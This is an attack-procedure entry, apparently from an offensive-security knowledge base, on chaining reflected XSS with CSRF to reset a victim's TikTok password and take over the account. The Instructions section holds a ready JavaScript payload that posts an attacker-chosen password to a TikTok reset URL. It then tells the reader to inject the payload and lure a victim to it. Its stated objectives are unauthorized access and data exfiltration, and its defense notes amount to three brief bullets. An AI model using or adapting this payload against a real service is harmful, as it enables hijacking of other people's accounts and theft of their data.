---
tags:
  - xss
  - csrf
  - account-takeover
  - chained-exploit
type: procedure
tools: []
tactics:
  - '[[Persistence]]'
commands: []
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
skill_level: advanced
impact_level: critical
detection_risk: high
sub_techniques: []
id: 41673135-d0f7-4b98-800c-c3cc0b8a6ca2
created_at: '2025-12-14T00:11:25.360Z'
updated_at: '2025-12-14T00:11:25.360Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Persistence]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
---
# Chain XSS and CSRF to Achieve Account Takeover

## Summary

This procedure chains reflected XSS with CSRF by injecting a payload that triggers an unauthorized password reset, leading to full account takeover on TikTok.

## Description

Combine the vulnerabilities to create a one-click exploit where the XSS payload automatically sends a CSRF request, changing the victim's password without interaction.

## Requirements

1. Exploitable XSS and CSRF vulnerabilities
2. Crafted payload for injection
3. Victim logged into target account

## Defense

Defensive measures and detection strategies:

- Fix individual vulnerabilities (sanitization, CSRF tokens)
- Implement multi-factor authentication
- Monitor for chained attack patterns

## Objectives

1. Achieve unauthorized account access
2. Enable data exfiltration
3. Demonstrate full takeover

## Instructions

### Step 1: Craft Chained Payload

**Context**: Create JS that performs the CSRF request.

```javascript
var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://www.tiktok.com/password/reset'); xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr.send('new_password=attackerpassword&account_id=thirdpartyaccount');
```

> Wrap in <script> tags for XSS injection.

### Step 2: Inject and Execute

**Context**: Inject into XSS parameter and lure victim to URL.

> Upon load, payload executes CSRF, changing password.

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence]]

### Techniques

- [[JavaScript]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used



## Tools Used



## Tags

- [[xss]]
- [[csrf]]
- [[account-takeover]]
